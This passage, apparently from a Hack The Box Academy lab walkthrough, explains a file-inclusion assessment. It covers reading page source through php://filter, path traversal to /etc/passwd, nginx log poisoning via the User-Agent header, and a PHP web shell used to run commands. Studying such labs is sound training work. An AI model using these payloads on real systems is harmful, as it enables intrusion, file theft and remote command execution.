yaXB0IHNyYz0ianMvanF1ZXJ5LXVpLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvcG9wcGVyLm1pbi5qcyI+PC9zY3JpcHQ+CiAgPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9vd2wuY2Fyb3VzZWwubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LnN0ZWxsYXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmNvdW50ZG93bi5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnkubWFnbmlmaWMtcG9wdXAubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYm9vdHN0cmFwLWRhdGVwaWNrZXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYW9zLmpzIj48L3NjcmlwdD4KCiAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgCiAgPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d
```

Skills Assessment - File Inclusion

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-0acwh0hrp7]─[~]
└──╼ [★]$ echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDx0aXRsZT5JbmxhbmVGcmVpZ2h0PC90aXRsZT4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9UG9wcGluczoyMDAsMzAwLDQwMCw3MDAsOTAwfERpc3BsYXkrUGxheWZhaXI6MjAwLDMwMCw0MDAsNzAwIj4gCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImZvbnRzL2ljb21vb24vc3R5bGUuY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9tYWduaWZpYy1wb3B1cC5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvanF1ZXJ5LXVpLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wuY2Fyb3VzZWwubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wudGhlbWUuZGVmYXVsdC5taW4uY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAtZGF0ZXBpY2tlci5jc3MiPgoKICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iZm9udHMvZmxhdGljb24vZm9udC9mbGF0aWNvbi5jc3MiPgoKCgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvYW9zLmNzcyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICAgIAogIDwvaGVhZD4KICA8Ym9keT4KICAKICA8ZGl2IGNsYXNzPSJzaXRlLXdyYXAiPgoKICAgIDxkaXYgY2xhc3M9InNpdGUtbW9iaWxlLW1lbnUiPgogICAgICA8ZGl2IGNsYXNzPSJzaXRlLW1vYmlsZS1tZW51LWhlYWRlciI+CiAgICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1jbG9zZSBtdC0zIj4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJpY29uLWNsb3NlMiBqcy1tZW51LXRvZ2dsZSI+PC9zcGFuPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1ib2R5Ij48L2Rpdj4KICAgIDwvZGl2PgogICAgCiAgICA8aGVhZGVyIGNsYXNzPSJzaXRlLW5hdmJhciBweS0zIiByb2xlPSJiYW5uZXIiPgoKICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICAgIAogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTExIGNvbC14bC0yIj4KICAgICAgICAgICAgPGgxIGNsYXNzPSJtYi0wIj48YSBocmVmPSJpbmRleC5waHAiIGNsYXNzPSJ0ZXh0LXdoaXRlIGgyIG1iLTAiPklubGFuZUZyZWlnaHQ8L2E+PC9oMT4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC0xMCBkLW5vbmUgZC14bC1ibG9jayI+CiAgICAgICAgICAgIDxuYXYgY2xhc3M9InNpdGUtbmF2aWdhdGlvbiBwb3NpdGlvbi1yZWxhdGl2ZSB0ZXh0LXJpZ2h0IiByb2xlPSJuYXZpZ2F0aW9uIj4KCiAgICAgICAgICAgICAgPHVsIGNsYXNzPSJzaXRlLW1lbnUganMtY2xvbmUtbmF2IG14LWF1dG8gZC1ub25lIGQtbGctYmxvY2siPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJhY3RpdmUiPjxhIGhyZWY9ImluZGV4LnBocCI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWluZHVzdHJpZXMiPkluZHVzdHJpZXM8L2E+PC9saT4KICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0PC9hPjwvbGk+CgkJPD9waHAgCgkJICAvLyBlY2hvICc8bGk+PGEgaHJlZj0iaWxmX2FkbWluL2luZGV4LnBocCI+QWRtaW48L2E+PC9saT4nOyAKCQk/PgogICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvbmF2PgogICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgIDxkaXYgY2xhc3M9ImQtaW5saW5lLWJsb2NrIGQteGwtbm9uZSBtbC1tZC0wIG1yLWF1dG8gcHktMyIgc3R5bGU9InBvc2l0aW9uOiByZWxhdGl2ZTsgdG9wOiAzcHg7Ij48YSBocmVmPSIjIiBjbGFzcz0ic2l0ZS1tZW51LXRvZ2dsZSBqcy1tZW51LXRvZ2dsZSB0ZXh0LXdoaXRlIj48c3BhbiBjbGFzcz0iaWNvbi1tZW51IGgzIj48L3NwYW4+PC9hPjwvZGl2PgoKICAgICAgICAgIDwvZGl2PgoKICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICAgIAogICAgPC9oZWFkZXI+CgogIAoKICAgIDxkaXYgY2xhc3M9InNpdGUtYmxvY2tzLWNvdmVyIG92ZXJsYXkiIHN0eWxlPSJiYWNrZ3JvdW5kLWltYWdlOiB1cmwoaW1hZ2VzL2hlcm9fYmdfMS5qcGcpOyIgZGF0YS1hb3M9ImZhZGUiIGRhdGEtc3RlbGxhci1iYWNrZ3JvdW5kLXJhdGlvPSIwLjUiPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyBhbGlnbi1pdGVtcy1jZW50ZXIganVzdGlmeS1jb250ZW50LWNlbnRlciB0ZXh0LWNlbnRlciI+CgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTgiIGRhdGEtYW9zPSJmYWRlLXVwIiBkYXRhLWFvcy1kZWxheT0iNDAwIj4KICAgICAgICAgICAgCgogICAgICAgICAgICA8aDEgY2xhc3M9InRleHQtd2hpdGUgZm9udC13ZWlnaHQtbGlnaHQgbWItNSB0ZXh0LXVwcGVyY2FzZSBmb250LXdlaWdodC1ib2xkIj5Xb3JsZHdpZGUgRnJlaWdodCBTZXJ2aWNlczwvaDE+CiAgICAgICAgICAgIDxwPjxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgcHktMyBweC01IHRleHQtd2hpdGUiPkdldCBTdGFydGVkITwvYT48L3A+CgogICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+ICAKCjw/cGhwCmlmKCFpc3NldCgkX0dFVFsncGFnZSddKSkgewogIGluY2x1ZGUgIm1haW4ucGhwIjsKfQplbHNlIHsKICAkcGFnZSA9ICRfR0VUWydwYWdlJ107CiAgaWYgKHN0cnBvcygkcGFnZSwgIi4uIikgIT09IGZhbHNlKSB7CiAgICBpbmNsdWRlICJlcnJvci5waHAiOwogIH0KICBlbHNlIHsKICAgIGluY2x1ZGUgJHBhZ2UgLiAiLnBocCI7CiAgfQp9Cj8+CiAgICA8Zm9vdGVyIGNsYXNzPSJzaXRlLWZvb3RlciI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93IHB0LTUgbXQtNSB0ZXh0LWNlbnRlciI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJib3JkZXItdG9wIHB0LTUiPgogICAgICAgICAgICA8cD4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgQ29weXJpZ2h0ICZjb3B5OzxzY3JpcHQ+ZG9jdW1lbnQud3JpdGUobmV3IERhdGUoKS5nZXRGdWxsWWVhcigpKTs8L3NjcmlwdD4gQWxsIHJpZ2h0cyByZXNlcnZlZCB8IFRoaXMgdGVtcGxhdGUgaXMgbWFkZSB3aXRoIDxpIGNsYXNzPSJpY29uLWhlYXJ0IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiBieSA8YSBocmVmPSJodHRwczovL2NvbG9ybGliLmNvbSIgdGFyZ2V0PSJfYmxhbmsiID5Db2xvcmxpYjwvYT4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgPC9mb290ZXI+CiAgPC9kaXY+CgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnktMy4zLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LW1pZ3JhdGUtMy4wLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LXVpLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvcG9wcGVyLm1pbi5qcyI+PC9zY3JpcHQ+CiAgPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9vd2wuY2Fyb3VzZWwubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LnN0ZWxsYXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmNvdW50ZG93bi5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnkubWFnbmlmaWMtcG9wdXAubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYm9vdHN0cmFwLWRhdGVwaWNrZXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYW9zLmpzIj48L3NjcmlwdD4KCiAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgCiAgPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d<!DOCTYPE html>
<html lang="en">
  <SNIP>
		<?php
		  // echo '<li><a href="ilf_admin/index.php">Admin</a></li>';
		?>
<SNIP>

```

From the decoded base64 `index` page, students will notice that there is a link to a hidden page, `ilf_admin/index.php`, thus, utilizing the same technique used for reading the source of the `index` page, students need to read the source of the `ilf_admin/index.php` page:

Skills Assessment - File Inclusion

```
view-source:http://STMIP:STMPO/index.php?page=php://filter/convert.base64-encode/resource=ilf_admin/index
```

![](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_23.png)

Students need to decode the base64-encoded `ilf_admin/index` page:

Code: shell

```
echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiA+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8dGl0bGU+SW5sYW5lRnJlaWdodDwvdGl0bGU+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+Cgo8L2hlYWQ+Cjxib2R5PgoKCjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4gICAgCiAgICB3aW5kb3cuaGlzdG9yeS5mb3J3YXJkKCk7CiAgICBmdW5jdGlvbiBwcmV2ZW50KCkKICAgIHsKICAgICB3aW5kb3cuaGlzdG9yeS5mb3J3YXJkKCk7IAogICAgfQogICAgPC9zY3JpcHQ+CgkKPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iYy5jc3MiIC8+CgoKCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CmJvZHkgewoJcGFkZGluZy10b3A6IDYwcHg7CglwYWRkaW5nLWJvdHRvbTogNDBweDsKfQoKLnNpZGViYXItbmF2IHsKICBwYWRkaW5nOiA5cHggMDsKICBtYXJnaW4tdG9wOiAzMHB4Owp9Ci5tYWluUGFnZXsKCWhlaWdodDogMTAwJQp9CgpAbWVkaWEgKCBtYXgtd2lkdGggOiA5ODBweCkgewoJLyogRW5hYmxlIHVzZSBvZiBmbG9hdGVkIG5hdmJhciB0ZXh0ICovCgkubmF2YmFyLXRleHQucHVsbC1yaWdodCB7CgkJZmxvYXQ6IG5vbmU7CgkJcGFkZGluZy1sZWZ0OiA1cHg7CgkJcGFkZGluZy1yaWdodDogNXB4OwoJfQp9CgouZGlzcGxheSB7CiAgd2lkdGg6IDcwJTsKICBoZWlnaHQ6IDQwMHB4OwogIHBhZGRpbmctYm90dG9tOiAyNTBweDsKICBib3JkZXI6IDFweCBzb2xpZCBibGFjazsgCiAgbWFyZ2luLWxlZnQ6IDI1MHB4OwogIG1hcmdpbi10b3A6IDMwcHg7CiAgb3ZlcmZsb3cteTogc2Nyb2xsOwp9Cgo8L3N0eWxlPgoKPHRpdGxlPklubGFuZUZyZWlnaHQ8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keSBvbmxvYWQ9InByZXZlbnQoKTsiICBvbnVubG9hZD0iIj4KCTxkaXYgY2xhc3M9Im5hdmJhciBuYXZiYXItaW52ZXJzZSBuYXZiYXItZml4ZWQtdG9wIj4KCQk8ZGl2IGNsYXNzPSJuYXZiYXItaW5uZXIiPgoJCQk8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPgoJCQkJPGEgY2xhc3M9ImJyYW5kIj5BZG1pbiBQYW5lbDwvYT4KCQkJCTxkaXYgY2xhc3M9Im5hdi1jb2xsYXBzZSBjb2xsYXBzZSI+CgkJCTwvZGl2PgoJCTwvZGl2PgoJPC9kaXY+CgoJPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KCQk8ZGl2IGNsYXNzPSJyb3ctZmx1aWQgbWFpblBhZ2UiPgoJCQk8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4KCQkJCTxkaXYgY2xhc3M9IndlbGwgc2lkZWJhci1uYXYiPgoJCQkJCTx1bCBpZD0ic2lkZUJhciIgY2xhc3M9Im5hdiBuYXYtbGlzdCI+CgkJCQkJCTxsaSBjbGFzcz0ibmF2LWhlYWRlciI+RGF0YSBMb2dzPC9saT4KCQkJCQkJCTxsaSBpZD0ibXRtaS1tZW51IiBuYW1lPSJtb250aGluZm8iPjxhIGhyZWY9ImluZGV4LnBocD9sb2c9Y2hhdC5sb2ciPjxzcGFuPkNoYXQgTG9nPC9zcGFuPjwvYT48L2xpPgoJCQkJCQkJPGxpIGlkPSJtdG1pLW1lbnUiIG5hbWU9Im10bWkiPjxhIGhyZWY9ImluZGV4LnBocD9sb2c9aHR0cC5sb2ciPjxzcGFuPlNlcnZpY2UgTG9nPC9zcGFuPjwvYT48L2xpPgoJCQkJCQk8bGkgY2xhc3M9Im5hdi1oZWFkZXIiPlBlcmZvcm1hbmNlIFZpZXc8L2xpPgoJCQkJCQkJPGxpIGlkPSJtb250aGluZm8tbWVudSIgbmFtZT0ibW9udGhpbmZvIj48YSBocmVmPSJpbmRleC5waHA/bG9nPXN5c3RlbS5sb2ciPjxzcGFuPlN5c3RlbSBMb2c8L3NwYW4+PC9hPjwvbGk+CgkJCQkJPC91bD4KCQkJCTwvZGl2PgoJCQkJPCEtLS8ud2VsbCAtLT4KCQkJPC9kaXY+CgkJPC9kaXY+Cgk8L2Rpdj4KCTxkaXYgY2xhc3M9ImRpc3BsYXkiPgoJPD9waHAKCWlmKGlzc2V0KCRfR0VUWydsb2cnXSkpIHsKCSAgJGxvZyA9ICJsb2dzLyIgLiAkX0dFVFsnbG9nJ107CgkgIGVjaG8gIjxwcmU+IjsKCSAgaW5jbHVkZSAkbG9nOwoJICBlY2hvICI8L3ByZT4iOwoJfQoJPz4KCTwvZGl2PgoJCgk8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmpzIj48L3NjcmlwdD4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9ImpzL2Jvb3RzdHJhcC5qcyI+PC9zY3JpcHQ+CgkKPC9ib2R5Pgo8L2h0bWw+CjwhLS0gcGFydGlhbCAtLT4KICAKPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d

```

Skills Assessment - File Inclusion

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-0acwh0hrp7]─[~]
└──╼ [★]$ echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiA+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8dGl0bGU+SW5sYW5lRnJlaWdodDwvdGl0bGU+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+Cgo8L2hlYWQ+Cjxib2R5PgoKCjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4gICAgCiAgICB3aW5kb3cuaGlzdG9yeS5mb3J3YXJkKCk7CiAgICBmdW5jdGlvbiBwcmV2ZW50KCkKICAgIHsKICAgICB3aW5kb3cuaGlzdG9yeS5mb3J3YXJkKCk7IAogICAgfQogICAgPC9zY3JpcHQ+CgkKPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iYy5jc3MiIC8+CgoKCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CmJvZHkgewoJcGFkZGluZy10b3A6IDYwcHg7CglwYWRkaW5nLWJvdHRvbTogNDBweDsKfQoKLnNpZGViYXItbmF2IHsKICBwYWRkaW5nOiA5cHggMDsKICBtYXJnaW4tdG9wOiAzMHB4Owp9Ci5tYWluUGFnZXsKCWhlaWdodDogMTAwJQp9CgpAbWVkaWEgKCBtYXgtd2lkdGggOiA5ODBweCkgewoJLyogRW5hYmxlIHVzZSBvZiBmbG9hdGVkIG5hdmJhciB0ZXh0ICovCgkubmF2YmFyLXRleHQucHVsbC1yaWdodCB7CgkJZmxvYXQ6IG5vbmU7CgkJcGFkZGluZy1sZWZ0OiA1cHg7CgkJcGFkZGluZy1yaWdodDogNXB4OwoJfQp9CgouZGlzcGxheSB7CiAgd2lkdGg6IDcwJTsKICBoZWlnaHQ6IDQwMHB4OwogIHBhZGRpbmctYm90dG9tOiAyNTBweDsKICBib3JkZXI6IDFweCBzb2xpZCBibGFjazsgCiAgbWFyZ2luLWxlZnQ6IDI1MHB4OwogIG1hcmdpbi10b3A6IDMwcHg7CiAgb3ZlcmZsb3cteTogc2Nyb2xsOwp9Cgo8L3N0eWxlPgoKPHRpdGxlPklubGFuZUZyZWlnaHQ8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keSBvbmxvYWQ9InByZXZlbnQoKTsiICBvbnVubG9hZD0iIj4KCTxkaXYgY2xhc3M9Im5hdmJhciBuYXZiYXItaW52ZXJzZSBuYXZiYXItZml4ZWQtdG9wIj4KCQk8ZGl2IGNsYXNzPSJuYXZiYXItaW5uZXIiPgoJCQk8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPgoJCQkJPGEgY2xhc3M9ImJyYW5kIj5BZG1pbiBQYW5lbDwvYT4KCQkJCTxkaXYgY2xhc3M9Im5hdi1jb2xsYXBzZSBjb2xsYXBzZSI+CgkJCTwvZGl2PgoJCTwvZGl2PgoJPC9kaXY+CgoJPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KCQk8ZGl2IGNsYXNzPSJyb3ctZmx1aWQgbWFpblBhZ2UiPgoJCQk8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4KCQkJCTxkaXYgY2xhc3M9IndlbGwgc2lkZWJhci1uYXYiPgoJCQkJCTx1bCBpZD0ic2lkZUJhciIgY2xhc3M9Im5hdiBuYXYtbGlzdCI+CgkJCQkJCTxsaSBjbGFzcz0ibmF2LWhlYWRlciI+RGF0YSBMb2dzPC9saT4KCQkJCQkJCTxsaSBpZD0ibXRtaS1tZW51IiBuYW1lPSJtb250aGluZm8iPjxhIGhyZWY9ImluZGV4LnBocD9sb2c9Y2hhdC5sb2ciPjxzcGFuPkNoYXQgTG9nPC9zcGFuPjwvYT48L2xpPgoJCQkJCQkJPGxpIGlkPSJtdG1pLW1lbnUiIG5hbWU9Im10bWkiPjxhIGhyZWY9ImluZGV4LnBocD9sb2c9aHR0cC5sb2ciPjxzcGFuPlNlcnZpY2UgTG9nPC9zcGFuPjwvYT48L2xpPgoJCQkJCQk8bGkgY2xhc3M9Im5hdi1oZWFkZXIiPlBlcmZvcm1hbmNlIFZpZXc8L2xpPgoJCQkJCQkJPGxpIGlkPSJtb250aGluZm8tbWVudSIgbmFtZT0ibW9udGhpbmZvIj48YSBocmVmPSJpbmRleC5waHA/bG9nPXN5c3RlbS5sb2ciPjxzcGFuPlN5c3RlbSBMb2c8L3NwYW4+PC9hPjwvbGk+CgkJCQkJPC91bD4KCQkJCTwvZGl2PgoJCQkJPCEtLS8ud2VsbCAtLT4KCQkJPC9kaXY+CgkJPC9kaXY+Cgk8L2Rpdj4KCTxkaXYgY2xhc3M9ImRpc3BsYXkiPgoJPD9waHAKCWlmKGlzc2V0KCRfR0VUWydsb2cnXSkpIHsKCSAgJGxvZyA9ICJsb2dzLyIgLiAkX0dFVFsnbG9nJ107CgkgIGVjaG8gIjxwcmU+IjsKCSAgaW5jbHVkZSAkbG9nOwoJICBlY2hvICI8L3ByZT4iOwoJfQoJPz4KCTwvZGl2PgoJCgk8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmpzIj48L3NjcmlwdD4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9ImpzL2Jvb3RzdHJhcC5qcyI+PC9zY3JpcHQ+CgkKPC9ib2R5Pgo8L2h0bWw+CjwhLS0gcGFydGlhbCAtLT4KICAKPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d<!DOCTYPE html>
<html lang="en" >

<SNIP>

	<?php
	if(isset($_GET['log'])) {$log = "logs/" . $_GET['log'];	  echo "<pre>";
	  include$log;	  echo "</pre>";
	}
	?>

<SNIP>

```

From within the `ilf_admin/index` page source, students will notice that there exists a basic LFI vulnerability:

Code: php

```php
<?phpif(isset($_GET['log'])) {
	  $log = "logs/" . $_GET['log'];
	  echo "<pre>";
	  include $log;
	  echo "</pre>";
	}
?>
```

Therefore, students need to weaponize this vulnerability to attempt reading files on the backend server, such as `/etc/passwd`:

Code: shell

```
curl -s http://STMIP:STMPO/ilf_admin/index.php?log=../../../../../../../etc/passwd | tr "\n" "|" | grep -o '<pre>.*</pre>'
```

Skills Assessment - File Inclusion

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-0acwh0hrp7]─[~]
└──╼ [★]$ curl -s http://138.68.166.182:31470/ilf_admin/index.php?log=../../../../../../../etc/passwd | tr "\n" "|" | grep -o '<pre>.*</pre>'<pre>root:x:0:0:root:/root:/bin/ash|bin:x:1:1:bin:/bin:/sbin/nologin|daemon:x:2:2:daemon:/sbin:/sbin/nologin|adm:x:3:4:adm:/var/adm:/sbin/nologin|lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin|sync:x:5:0:sync:/sbin:/bin/sync|shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown|halt:x:7:0:halt:/sbin:/sbin/halt|mail:x:8:12:mail:/var/mail:/sbin/nologin|news:x:9:13:news:/usr/lib/news:/sbin/nologin|uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin|operator:x:11:0:operator:/root:/sbin/nologin|man:x:13:15:man:/usr/man:/sbin/nologin|postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin|cron:x:16:16:cron:/var/spool/cron:/sbin/nologin|ftp:x:21:21::/var/lib/ftp:/sbin/nologin|sshd:x:22:22:sshd:/dev/null:/sbin/nologin|at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin|squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin|xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin|games:x:35:35:games:/usr/games:/sbin/nologin|cyrus:x:85:12::/usr/cyrus:/sbin/nologin|vpopmail:x:89:89::/var/vpopmail:/sbin/nologin|ntp:x:123:123:NTP:/var/empty:/sbin/nologin|smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin|guest:x:405:100:guest:/dev/null:/sbin/nologin|nobody:x:65534:65534:nobody:/:/sbin/nologin|nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin|</pre>
```

Now that students have confirmed this LFI vulnerability exists and can be weaponized, they need to determine whether the web server running on the backend is `Apache` or `Nginx`. When including the `access.log` file of `Nginx` through the LFI vulnerability, its output is returned:

Code: shell

```
curl -s http://STMIP:STMPO/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log | tr "\n" "|" | grep -o '<pre>.*</pre>'
```

Skills Assessment - File Inclusion

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-gap9qocwkb]─[~]
└──╼ [★]$ curl -s http://159.65.63.151:32743/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log | tr "\n" "|" | grep -o '<pre>.*</pre>'<pre>159.65.63.151 - - [06/Nov/2022:09:16:21 +0000] "GET /ilf_admin/index.php?log=../../../../../../../var/log/apache2/access.log HTTP/1.1" 200 2058 "-" "curl/7.74.0"|159.65.63.151 - - [06/Nov/2022:09:17:38 +0000] "GET /ilf_admin/index.php?log=../../../../../../../var/log/apache2/access.log HTTP/1.1" 504 494 "-" "curl/7.74.0"|</pre>
```

Thus, `Nginx` is running on the backend server. Students now need to poison the `User-Agent` header. To do so, students need to use an intercepting proxy such as `Burp Suite`, or, the Networking tab of the Web Developer Tools, to capture the request that includes the `Nginx` log file through the LFI vulnerability and poison the `User-Agent` header to be a PHP web shell. Using `Firefox`, students need to navigate to `http://STMIP:STMPO/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log`, open the Network tab of the Web Developer Tools, then refresh the page, to notice that there is a `GET` request to `index.php?`, thus they need to click on it, and click on `Resend` -> `Edit and Resend`:

![](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_24.png)

Subsequently, students need to poison the `User-Agent` header to be a PHP web shell then send the edited request:

Code: php

```php
<?php system($_GET['cmd']);?>
```

![](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_25.png)

Students now will be able to execute commands on the backend server utilizing the `cmd` URL parameter. Therefore, students need to list the files that are in the root directory `/`:

Skills Assessment - File Inclusion

```
http://STMIP:STMPO/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=ls%20/
```

![](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_26.png)

